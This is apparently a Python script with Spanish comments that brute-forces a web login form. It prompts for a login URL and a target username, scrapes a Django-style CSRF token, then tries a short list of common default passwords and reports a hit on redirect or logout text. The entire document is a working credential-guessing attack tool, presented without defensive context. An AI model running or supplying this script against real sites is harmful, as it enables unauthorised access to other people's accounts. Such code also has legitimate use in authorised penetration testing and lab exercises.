import requests
from bs4 import BeautifulSoup

# === CONFIGURACIÓN ===
URL_LOGIN = input("URL de login (ej: http://192.168.1.10:8000/login): ")
USUARIO = input("Usuario objetivo: ")
CLAVES = ["admin", "admin123", "admin1234", "123456", "toor"]

# === SESIÓN PERSISTENTE ===
session = requests.Session()

# === OBTENER TOKEN CSRF ===
get_response = session.get(URL_LOGIN)
soup = BeautifulSoup(get_response.text, 'html.parser')

csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
print(f"CSRF Token obtenido: {csrf_token}")

# === FUERZA BRUTA ===
for clave in CLAVES:
    print(f"Probando clave: {clave}")
    payload = {
        'username': USUARIO,
        'password': clave,
        'csrfmiddlewaretoken': csrf_token
    }

    headers = {
        'Referer': URL_LOGIN  # Necesario para CSRF en muchos frameworks
    }

    response = session.post(URL_LOGIN, data=payload, headers=headers)

    if response.status_code in [302, 303]:
        print(f"Clave válida encontrada: {clave}")
        break

    if "cerrar sesión" in response.text.lower() or "logout" in response.text.lower():
        print(f"Login exitoso con clave: {clave}")
        break

    if "Por favor, introduzca un nombre de usuario y una contraseña correctos" not in response.text:
        print(f"Respuesta inesperada. Revisa la respuesta manualmente.")
else:
    print("No se encontró una clave válida con este diccionario.")
